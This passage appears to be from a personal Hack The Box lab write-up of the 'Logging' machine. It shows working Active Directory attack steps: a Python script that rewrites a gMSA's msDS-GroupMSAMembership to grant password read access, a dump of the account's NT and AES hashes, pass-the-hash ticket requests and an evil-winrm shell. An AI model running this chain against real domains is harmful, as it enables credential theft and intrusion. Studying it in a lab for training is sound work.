+</section>
+<section id="attacking-gmsa-group-managed-service-accounts">
+<h2>Attacking GMSA (Group Managed Service Accounts)<a class="headerlink" href="#attacking-gmsa-group-managed-service-accounts" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://medium.com/&#64;offsecdeer/attacking-group-managed-service-accounts-gmsa-5e9c54c56e49">attacking GMSA</a></p></li>
+</ul>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>bloodyAD.py<span class="w"> </span>...<span class="w"> </span>get<span class="w"> </span>search<span class="w"> </span><span class="s1">&#39;DC=logging,DC=htb&#39;</span><span class="w"> </span><span class="s1">&#39;(objectClass=msDS-GroupManagedServiceAccount)&#39;</span>
+</pre></div>
+</div>
+<p>RID Group Name Target Type
+513 Domain Users Standard user accounts.
+515 Domain Computers Standard workstations and member servers.
+516 Domain Controllers The “crown jewels” (DCs).</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>/etc/krb5.conf
+<span class="o">[</span>libdefaults<span class="o">]</span>
+<span class="w">    </span><span class="nv">default_realm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>LOGGING.HTB
+<span class="w">    </span><span class="nv">dns_lookup_realm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span>
+<span class="w">    </span><span class="nv">dns_lookup_kdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span>
+
+<span class="o">[</span>realms<span class="o">]</span>
+<span class="w">    </span>LOGGING.HTB<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="nv">kdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>logging.htb
+<span class="w">        </span><span class="nv">admin_server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>logging.htb
+<span class="w">    </span><span class="o">}</span>
+
+<span class="o">[</span>domain_realm<span class="o">]</span>
+<span class="w">    </span>.logging.htb<span class="w"> </span><span class="o">=</span><span class="w"> </span>LOGGING.HTB
+<span class="w">    </span>logging.htb<span class="w"> </span><span class="o">=</span><span class="w"> </span>LOGGING.HTB
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>cyrus-sasl-gssapi
+</pre></div>
+</div>
+<p>Logging in as <code class="docutils literal notranslate"><span class="pre">svc_recovery</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kinit<span class="w"> </span>svc_recovery@LOGGING.HTB
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://10.129.39.50:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-Y<span class="w"> </span>GSSAPI<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s1">&#39;DC=logging,DC=htb&#39;</span>
+</pre></div>
+</div>
+<p><strong>MsDS-GroupMSAMembership</strong> is a list users or groups authorized to read the <strong>GMSA</strong> password
+stored in the form of a raw binary <strong>Windows Security Descriptor (DACL+SACL)</strong>.</p>
+<ul class="simple">
+<li><p><strong>DACL</strong>: Discretionary Access Control List
+Defines who has access to an object (like a file, user, or active directory object).
+Contains specific rules stating which users or groups are Allowed or Denied read,
+write, or execute permissions.</p></li>
+<li><p><strong>SACL</strong>: System Access Control List
+Defines what gets audited or logged. Tells the Domain Controller to generate a log
+event in the Windows Event Viewer when a specific user successfully accesses or fails
+to access an object.</p></li>
+</ul>
+<p>It is an attribute stored on the GMSA account itself</p>
+<p>We can read some of the GMSA account details but not the
+msDS-GroupMSAMembership. That’s how it should be by default.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://10.129.39.50:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-Y<span class="w"> </span>GSSAPI<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s1">&#39;CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-s<span class="w"> </span>base<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;(objectClass=*)&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>sAMAccountName<span class="w"> </span>msDS-GroupMSAMembership<span class="w"> </span><span class="s1">&#39;+&#39;</span>
+</pre></div>
+</div>
+<p>But we have <strong>GenericWrite</strong> nevertheless. So we should be able to
+overwrite the attribute</p>
+<p>Just like with ldapsearch, NTLM bind doesn’t work</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">ldap3</span>
+
+<span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="s2">&quot;10.129.39.50:389&quot;</span><span class="p">)</span>
+<span class="n">client</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span>
+    <span class="n">server</span><span class="p">,</span>
+    <span class="n">user</span><span class="o">=</span><span class="s2">&quot;logging.htb</span><span class="se">\\</span><span class="s2">svc_recovery&quot;</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="s2">&quot;Em3***************,</span>
+    <span class="n">authentication</span><span class="o">=</span><span class="n">ldap3</span><span class="o">.</span><span class="n">NTLM</span><span class="p">,</span>
+    <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<span class="p">)</span>
+</pre></div>
+</div>
+<p>So we’re using Kerberos instead</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">pip</span> <span class="n">install</span> <span class="n">gssapi</span>
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">ldap3</span>
+
+<span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="s2">&quot;10.129.39.50&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">389</span><span class="p">)</span>
+<span class="n">client</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span>
+    <span class="n">server</span><span class="p">,</span>
+    <span class="n">authentication</span><span class="o">=</span><span class="n">ldap3</span><span class="o">.</span><span class="n">SASL</span><span class="p">,</span>
+    <span class="n">sasl_mechanism</span><span class="o">=</span><span class="s2">&quot;GSSAPI&quot;</span><span class="p">,</span>
+    <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<span class="p">)</span>
+</pre></div>
+</div>
+<p>OK, so we’re <strong>svc_recovery</strong>, we have <strong>GenericWrite</strong> to <strong>msa_health</strong> which is a
+<strong>GMSA</strong>. So we’ll try to overwrite the <strong>msDS-GroupMSAMembership</strong> of <strong>msa_health</strong>
+to make <strong>wallace.everette</strong> a member, which should allow him to read the password
+of the <strong>GMSA</strong>.</p>
+<p>First let’s get <strong>Wallace</strong>’s <strong>SID</strong>.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://10.129.39.50:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-Y<span class="w"> </span>GSSAPI<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s1">&#39;DC=logging,DC=htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;(sAMAccountName=wallace.everette)&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>objectSid
+</pre></div>
+</div>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>SASL/GSSAPI authentication started
+SASL username: svc_recovery@LOGGING.HTB
+SASL SSF: 256
+SASL data security layer installed.
+# extended LDIF
+#
+# LDAPv3
+# base &lt;DC=logging,DC=htb&gt; with scope subtree
+# filter: (sAMAccountName=wallace.everette)
+# requesting: objectSid
+#
+
+# wallace.everette, Users, logging.htb
+dn: CN=wallace.everette,CN=Users,DC=logging,DC=htb
+objectSid:: AQUAAAAAAAUVAAAAB+eo71Gnr6a44kNkPwgAAA==
+
+# search reference
+ref: ldap://ForestDnsZones.logging.htb/DC=ForestDnsZones,DC=logging,DC=htb
+
+# search reference
+ref: ldap://DomainDnsZones.logging.htb/DC=DomainDnsZones,DC=logging,DC=htb
+
+# search reference
+ref: ldap://logging.htb/CN=Configuration,DC=logging,DC=htb
+
+# search result
+search: 4
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3
+</pre></div>
+</div>
+<p>OK well. ldapsearch will give us the raw data as it is stored in LDAP,
+and it is a SID in binary form, and base64 encoded. Here’s how to decode that into
+its canonical form with impacket.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.ldap.ldaptypes</span><span class="w"> </span><span class="kn">import</span> <span class="n">LDAP_SID</span>
+
+<span class="c1"># Decode the b64 into raw binary</span>
+<span class="n">binary_form</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s2">&quot;AQUAAAAAAAUVAAAAB+eo71Gnr6a44kNkPwgAAA==&quot;</span><span class="p">)</span>
+
+<span class="c1"># load the binary into an impacket LDAP_SID object</span>
+<span class="n">sid</span> <span class="o">=</span> <span class="n">LDAP_SID</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">binary_form</span><span class="p">)</span>
+
+<span class="c1"># Print the canonical, human-readable SID string</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Decoded SID: </span><span class="si">{</span><span class="n">sid</span><span class="o">.</span><span class="n">formatCanonical</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Or it would have been a lot easier to just use Active directory aware tools
+But where’s the fun in that.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.39.50 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get object &#39;wallace.everette&#39; --attr objectSid
+</pre></div>
+</div>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>distinguishedName: CN=wallace.everette,CN=Users,DC=logging,DC=htb
+objectSid: S-1-5-21-4020823815-2796529489-1682170552-2111
+</pre></div>
+</div>
+<p>Rebuild the gmsa group membership object from scratch</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">ldap3</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">impacket.ldap</span><span class="w"> </span><span class="kn">import</span> <span class="n">ldaptypes</span>
+
+<span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="s2">&quot;10.129.39.50:389&quot;</span><span class="p">)</span>
+<span class="n">client</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span>
+    <span class="n">server</span><span class="p">,</span>
+    <span class="n">authentication</span><span class="o">=</span><span class="n">ldap3</span><span class="o">.</span><span class="n">SASL</span><span class="p">,</span>
+    <span class="n">sasl_mechanism</span><span class="o">=</span><span class="s2">&quot;GSSAPI&quot;</span><span class="p">,</span>
+    <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="c1"># wallace.everette&#39;s SID</span>
+<span class="n">sid</span> <span class="o">=</span> <span class="s2">&quot;S-1-5-21-4020823815-2796529489-1682170552-2111&quot;</span>
+
+<span class="c1"># This builds the payload of the rule.</span>
+<span class="c1"># An Access Allowed Access Controll Entry</span>
+<span class="n">aaace</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">ACCESS_ALLOWED_ACE</span><span class="p">()</span>
+<span class="c1"># The Magic Number (983551):</span>
+<span class="c1"># This integer represents binary bit-flags mapping to specific</span>
+<span class="c1"># Active Directory permissions.</span>
+<span class="c1"># In Windows,this evaluates to Full Control</span>
+<span class="c1"># (combining read, write, create child, and extended rights).</span>
+<span class="n">aaace</span><span class="p">[</span><span class="s2">&quot;Mask&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">ACCESS_MASK</span><span class="p">()</span>
+<span class="n">aaace</span><span class="p">[</span><span class="s2">&quot;Mask&quot;</span><span class="p">][</span><span class="s2">&quot;Mask&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">983551</span>
+<span class="c1"># The Target: It converts Wallace&#39;s string SID into the binary</span>
+<span class="c1"># format Active Directory requires.</span>
+<span class="n">aaace</span><span class="p">[</span><span class="s2">&quot;Sid&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">LDAP_SID</span><span class="p">()</span>
+<span class="n">aaace</span><span class="p">[</span><span class="s2">&quot;Sid&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">fromCanonical</span><span class="p">(</span><span class="n">sid</span><span class="p">)</span>
+
+<span class="c1"># Access Control Entry (the specific rule inside the list).</span>
+<span class="n">ace</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">ACE</span><span class="p">()</span>
+<span class="c1"># ACCESS_ALLOWED_ACE_TYPE rule</span>
+<span class="n">ace</span><span class="p">[</span><span class="s2">&quot;AceType&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="c1"># will not be inherited by sub-folders</span>
+<span class="n">ace</span><span class="p">[</span><span class="s2">&quot;AceFlags&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">ace</span><span class="p">[</span><span class="s2">&quot;Ace&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">aaace</span>
+
+<span class="c1"># Start to build the DACL</span>
+<span class="n">dacl</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">ACL</span><span class="p">()</span>
+<span class="c1"># maps to standard modern Windows security headers.</span>
+<span class="n">dacl</span><span class="p">[</span><span class="s2">&quot;AclRevision&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="c1"># internal &quot;padding&quot; bytes defined by Microsoft that must be set to 0.</span>
+<span class="n">dacl</span><span class="p">[</span><span class="s2">&quot;Sbz1&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">dacl</span><span class="p">[</span><span class="s2">&quot;Sbz2&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">dacl</span><span class="o">.</span><span class="n">aces</span> <span class="o">=</span> <span class="p">[</span><span class="n">ace</span><span class="p">]</span>
+
+<span class="c1"># Start to build the SD</span>
+<span class="n">sd</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">SR_SECURITY_DESCRIPTOR</span><span class="p">()</span>
+<span class="c1"># Revision and 0 padding</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;Revision&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;Sbz1&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<span class="c1"># This flag sets a binary bitmask telling Windows that this DACL is Auto-Inherited</span>
+<span class="c1"># and should protect itself from being overwritten by folder templates</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;Control&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32772</span>
+<span class="c1"># Sets the highly privileged &quot;NT AUTHORITY\SYSTEM&quot; account</span>
+<span class="c1"># as the physical ownerof the security descriptor.</span>
+<span class="c1"># (the safest default to avoid locking everyone out).</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;OwnerSid&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">ldaptypes</span><span class="o">.</span><span class="n">LDAP_SID</span><span class="p">()</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;OwnerSid&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">fromCanonical</span><span class="p">(</span><span class="s2">&quot;S-1-5-18&quot;</span><span class="p">)</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;GroupSid&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+<span class="c1"># Map our DACL into the object&#39;s DACL slot,</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;Dacl&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">dacl</span>
+<span class="c1"># leaving the auditing list slot (SACL) completely blank.</span>
+<span class="n">sd</span><span class="p">[</span><span class="s2">&quot;Sacl&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+
+<span class="c1"># And finally we&#39;ll replace msDS-GroupMSAMembership with our crafted object</span>
+<span class="n">client</span><span class="o">.</span><span class="n">modify</span><span class="p">(</span>
+    <span class="s2">&quot;CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb&quot;</span><span class="p">,</span>
+    <span class="p">{</span>
+        <span class="s2">&quot;msDS-GroupMSAMembership&quot;</span><span class="p">:</span> <span class="p">[</span>
+            <span class="p">(</span>
+                <span class="n">ldap3</span><span class="o">.</span><span class="n">MODIFY_REPLACE</span><span class="p">,</span>
+                <span class="p">[</span>
+                    <span class="n">sd</span><span class="o">.</span><span class="n">getData</span><span class="p">(),</span>
+                <span class="p">],</span>
+            <span class="p">),</span>
+        <span class="p">],</span>
+    <span class="p">},</span>
+<span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">result</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>Boom</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>grant_gmsa_read.py
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;result&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;success&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;dn&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;referrals&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;modifyResponse&quot;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>Wallace can see the msDS-GroupMSAMembership now</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;wallace.everette&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;We**********&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.129.39.50<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>DC01.logging.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;logging.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>get<span class="w"> </span>object<span class="w"> </span><span class="s1">&#39;msa_health$&#39;</span><span class="w"> </span>--attr<span class="w"> </span>msDS-GroupMSAMembership
+
+
+distinguishedName:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>msa_health,CN<span class="o">=</span>Managed<span class="w"> </span>Service<span class="w"> </span>Accounts,DC<span class="o">=</span>logging,DC<span class="o">=</span>htb
+msDS-GroupMSAMembership:<span class="w"> </span>O:S-1-5-18D:<span class="o">(</span>A<span class="p">;;</span>0xf01ff<span class="p">;;;</span>S-1-5-21-4020823815-2796529489-1682170552-2111<span class="o">)</span>
+</pre></div>
+</div>
+<p>Maybe we could learn how to fully decode it with impacket? But in any case we can see
+Wallace’s SID in there already and what we really care about is the actual
+password itself, it should be under <strong>msDS-ManagedPassword</strong></p>
+<p>BloodyAd gives me an error, but there’s data here apparently</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;wallace.everette&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;We**********&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.129.39.50<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>DC01.logging.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;logging.htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>get<span class="w"> </span>object<span class="w"> </span><span class="s1">&#39;msa_health$&#39;</span><span class="w"> </span>--attr<span class="w"> </span>msDS-ManagedPassword
+</pre></div>
+</div>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">struct</span><span class="o">.</span><span class="n">error</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;unpack requires a buffer of 8 bytes&#39;</span><span class="p">,</span> <span class="s2">&quot;When unpacking field &#39;UnchangedPasswordInterval | &lt;Q | b&#39;&#39;[:8]&#39;&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Let me try to get the raw bytes
+Now let’s log in as wallace</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kinit<span class="w"> </span>wallace.everette@LOGGING.HTB
+Password<span class="w"> </span><span class="k">for</span><span class="w"> </span>wallace.everette@LOGGING.HTB:
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>venv<span class="o">)</span><span class="w"> </span><span class="o">[</span>blnkn@arch<span class="o">](</span><span class="nv">main</span><span class="w"> </span><span class="o">=)</span>:/opt/bloodyAD%<span class="w"> </span>ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://10.129.39.50:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-Y<span class="w"> </span>GSSAPI<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s1">&#39;CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-s<span class="w"> </span>base<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;(objectClass=*)&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>sAMAccountName<span class="w"> </span>msDS-ManagedPassword<span class="w"> </span><span class="s1">&#39;+&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-ldif notranslate"><div class="highlight"><pre><span></span>SASL/GSSAPI authentication started
+SASL username: wallace.everette@LOGGING.HTB
+SASL SSF: 256
+SASL data security layer installed.
+# extended LDIF
+#
+# LDAPv3
+# base &lt;CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb&gt; with scope baseObject
+# filter: (objectClass=*)
+# requesting: sAMAccountName msDS-ManagedPassword +
+#
+
+# msa_health, Managed Service Accounts, logging.htb
+dn: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
+sAMAccountName: msa_health$
+msDS-ManagedPassword:: AQAAACIBAAAQAAAAEgEaAUUyiVJopcrcnpEZMbhxICpBBQnTIG7wvOO
+ gDgEqYBmy3S7C2YVXf+p9/YtpsyKdafZyAIyUFLJh/b4xWTk+k15rgAhEWIS7HJ53+xhmTfBTTcjT
+ NvVNSHFu+p85PMoqijJta8lAr9XkpKjINW8pXlb4m2GmVwSpSthrIrWB/szxcAjl1gxRR/nhPSUoc
+ n86by495+6X0M2aFuD71fk/EUdCI/g9J2RcoDsnDLfqTNkl2eE4rvlcbrkgW9P38W0SMVftE87cRD
+ 2QOD+cDOnS/cDbZ57do2ncXiP1pQV+8Xiqh0tNLCZsUlKljLfPSTY5V2pyMA7iRQHA1gOfEDwgDPE
+ AAM3JgNYeEAAAzWuwIx4QAAA=
+
+# search result
+search: 4
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+</pre></div>
+</div>
+<p>Mmmmh yea or we can just use the same tools as everybody else,
+I’ll see later if I have time to dive deeper and experiment with decoding that
+stuff myself with impacket, as a thought experiment.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>gMSADumper.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;wallace.everette&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;We**********&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;logging.htb&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>Users or groups who can read password for msa_health$:
+ &gt; wallace.everette
+msa_health$:::603fc24ee01a9409f83c9d1d701485c5
+msa_health$:aes256-cts-hmac-sha1-96:b8dc25e7110a9bc35956fcfbd28da1193fbd597ae60c22297974d0a25437ab23
+msa_health$:aes128-cts-hmac-sha1-96:e012abfa4e08998cddb30f332a287010
+</pre></div>
+</div>
+<p>Now what, presumably we could crack those, and or just pass the hash</p>
+<p>PTH to get a TGT</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.39.50<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;logging.htb/msa_health$:&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-hashes<span class="w"> </span><span class="s1">&#39;:603fc24ee01a9409f83c9d1d701485c5&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in msa_health$.ccache
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/blnkn/sec/htb/machines/logging/tools/msa_health.ccache
+</pre></div>
+</div>
+<p>Or just winrm directly in the box</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>logging.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;msa_health$&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;603fc24ee01a9409f83c9d1d701485c5&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="further-enumeration-as-msa-health">
+<h2>Further Enumeration as msa health<a class="headerlink" href="#further-enumeration-as-msa-health" title="Permalink to this heading">#</a></h2>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">msa_health</span><span class="p">$\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">dir</span>
+
+
+    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">msa_health</span><span class="p">$\</span><span class="n">Documents</span>
+
+
+<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+<span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+<span class="n">-a</span><span class="p">----</span>        <span class="n">4</span><span class="p">/</span><span class="n">17</span><span class="p">/</span><span class="n">2026</span>   <span class="n">9</span><span class="p">:</span><span class="n">02</span> <span class="n">AM</span>           <span class="n">1059</span> <span class="n">monitor</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;#</span>
+<span class="sd">.SYNOPSIS</span>
+<span class="cm">    Monitors the status of the &quot;UpdateChecker Agent&quot; scheduled task.</span>
+<span class="cm">    Uses COM interface to avoid CIM/WMI permission issues.</span>
